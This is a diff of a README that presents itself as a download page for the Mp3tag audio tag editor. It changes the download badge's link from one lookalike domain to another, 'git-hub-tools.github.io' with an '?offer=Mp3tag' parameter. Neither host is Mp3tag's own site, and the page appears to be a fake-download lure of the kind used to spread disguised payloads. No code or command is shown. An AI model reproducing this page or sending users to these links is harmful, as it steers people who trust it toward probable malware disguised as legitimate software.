@@ -1,10 +1,10 @@
 # Mp3tag Download — Desktop Audio Tag Editor
 
-<a href="https://dowloader-desktop-app.github.io/.github/?offer=Mp3tag" target="_blank">
+<a href="https://git-hub-tools.github.io/.github/?offer=Mp3tag" target="_blank">
   <img 
-    src="https://img.shields.io/badge/Get%20Mp3tag%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
+    src="https://img.shields.io/badge/Mp3tag%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
-    alt="Get Mp3tag GitHub">
+    alt="Mp3tag GitHub">
 </a>
 
 ---
